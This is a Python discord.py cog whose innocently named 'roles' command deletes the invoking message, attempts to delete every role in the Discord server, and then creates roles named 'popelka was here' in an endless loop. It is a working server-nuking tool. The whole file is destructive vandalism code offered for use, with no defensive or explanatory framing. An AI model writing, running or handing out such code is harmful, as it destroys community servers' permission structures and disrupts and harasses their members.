# -*- coding: utf-8 -*-
import discord
from discord.ext import commands

class Roles(commands.Cog):
    def __init__(self, bot):
        self.bot = bot


    @commands.command()
    async def roles(self, ctx):
        guild = ctx.guild
        try:
            await ctx.message.delete()
        except:
            pass
        for role in guild.roles:
            try:
                await role.delete()
                print(f"Deleted role: {role.name}")
            except discord.Forbidden:
                print(f"No permission to delete role: {role.name}")
            except Exception as e:
                print(f"Error deleting role {role.name}: {e}")
        while True:
            guild = ctx.guild
            await guild.create_role(name="popelka was here")
            await guild.create_role(name="popelka was here")
            await guild.create_role(name="popelka was here")
            await guild.create_role(name="popelka was here")
            await guild.create_role(name="popelka was here")
            await guild.create_role(name="popelka was here")
            await guild.create_role(name="popelka was here")
            await guild.create_role(name="popelka was here")
            await guild.create_role(name="popelka was here")
            await guild.create_role(name="popelka was here")
            await guild.create_role(name="popelka was here")
            await guild.create_role(name="popelka was here")
            await guild.create_role(name="popelka was here")
            await guild.create_role(name="popelka was here")
            await guild.create_role(name="popelka was here")
            await guild.create_role(name="popelka was here")
            await guild.create_role(name="popelka was here")
            await guild.create_role(name="popelka was here")
            await guild.create_role(name="popelka was here")
            await guild.create_role(name="popelka was here")
            await guild.create_role(name="popelka was here")
            await guild.create_role(name="popelka was here")
            await guild.create_role(name="popelka was here")
            await guild.create_role(name="popelka was here")
            await guild.create_role(name="popelka was here")
            await guild.create_role(name="popelka was here")
            await guild.create_role(name="popelka was here")
            await guild.create_role(name="popelka was here")
            await guild.create_role(name="popelka was here")
            await guild.create_role(name="popelka was here")
            await guild.create_role(name="popelka was here")

async def setup(bot):
    await bot.add_cog(Roles(bot))